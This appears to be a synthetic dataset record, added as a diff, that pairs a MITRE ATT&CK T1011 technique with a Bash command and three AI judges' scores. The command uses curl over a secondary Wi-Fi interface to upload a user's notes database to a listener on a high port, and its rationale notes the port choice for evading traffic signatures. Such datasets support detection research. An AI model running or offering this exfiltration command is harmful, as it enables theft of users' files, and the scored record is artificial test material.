@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed Bash with correct redirections, logical operator usage, and valid curl flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file over Wi-Fi by binding curl to wlan1 (aligning with T1011), but as an unprivileged user on Linux --interface may fail when using an interface name and iwconfig does not verify link or route availability.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:01:32.531940Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid use of &&, properly quoted flags, balanced syntax, and correct curl flag usage including --interface, -T, and --max-time.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by first verifying the wlan1 interface exists via iwconfig, then using curl's --interface flag to bind the upload specifically to wlan1 (a secondary Wi-Fi interface), transferring a sensitive file to an HTTP listener on a high port, which is operationally realistic exfiltration over an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T21:53:26.798225Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax, valid shell redirection, and correctly formatted curl arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively verifies the presence of a secondary network interface and forces data exfiltration through it using tool-specific flags, perfectly matching T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T21:53:28.476921Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
